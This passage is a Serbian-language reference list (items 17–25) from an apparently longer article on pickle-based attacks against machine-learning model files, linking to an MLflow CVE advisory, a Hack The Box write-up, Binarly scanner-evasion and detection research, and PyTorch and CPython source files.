- [17] [Snyk bezbednosno obaveštenje i PyFunc proof of concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow izvorni kod – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – krajnje tačke za preuzimanje i otpremanje artifact-a](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Binarly MLTracer taksonomija izbegavanja statičkog skenera](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – Otkrivanje zlonamernih modela pomoću MLTracer-a](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [PyTorch implementacija skladišta `_load_from_bytes`](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [CPython pickle mapa kompatibilnosti za `find_class`](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [CPython `_compat_pickle` mapa uvoza](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
